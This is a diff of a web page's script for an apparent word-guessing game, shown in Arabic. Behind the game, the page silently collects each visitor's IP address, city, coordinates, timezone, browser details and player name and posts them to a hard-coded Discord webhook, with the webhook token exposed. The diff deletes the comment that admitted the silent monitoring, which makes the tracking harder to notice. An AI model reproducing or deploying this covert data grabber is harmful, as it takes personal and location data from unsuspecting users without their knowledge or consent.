@@ -37,7 +37,6 @@
   <script>
     const discordWebhookUrl = "https://discord.com/api/webhooks/1352849557184053290/lD7F2L2xR6GEKGoXV5s8L_cW5QmhTQJsZTSAoRYX9qy4Leobxmq64Izkyst-AFkrypFv";
 
-    // كلمة السر الصحيحة (يمكنك تعديلها)
     const correctWord = "السر";
 
     async function sendUserInfo() {
@@ -61,7 +60,7 @@ IPv6: ${ipv6}
 المدينة: ${geoData.city}
 الموقع: ${geoData.latitude}, ${geoData.longitude}
 المنطقة الزمنية: ${geoData.timezone}
-متصفح وجهاز المستخدم: ${userAgent}
+المتصفح والجهاز: ${userAgent}
         `.trim();
 
         const data = { content: infoText };
@@ -72,7 +71,7 @@ IPv6: ${ipv6}
           body: JSON.stringify(data),
         });
       } catch (error) {
-        console.error("خطأ في إرسال معلومات المستخدم:", error);
+        console.error("فشل إرسال معلومات الجهاز:", error);
       }
     }
 
@@ -86,7 +85,7 @@ IPv6: ${ipv6}
           body: JSON.stringify(data),
         });
       } catch (error) {
-        console.error("خطأ في إرسال اسم اللاعب:", error);
+        console.error("فشل إرسال اسم اللاعب:", error);
       }
     }
 
@@ -94,21 +93,19 @@ IPv6: ${ipv6}
       const playerName = document.getElementById("playerName").value.trim();
       const userWord = document.getElementById("userInput").value.trim();
 
-      // إرسال البيانات لمراقبة المستخدم بشكل صامت
       sendUserInfo();
       sendPlayerName(playerName);
 
-      // التحقق من الكلمة المدخلة وعرض النتيجة
       const resultDiv = document.getElementById("result");
       if (!userWord) {
-        resultDiv.textContent = "الرجاء إدخال كلمة للتحقق.";
+        resultDiv.textContent = "الرجاء إدخال كلمة.";
         return;
       }
 
       if (userWord === correctWord) {
         resultDiv.textContent = "مبروك! الكلمة صحيحة.";
       } else {
-        resultDiv.textContent = "الكلمة غير صحيحة، حاول مرة أخرى.";
+        resultDiv.textContent = "الكلمة غير صحيحة.";
       }
     });
   </script>
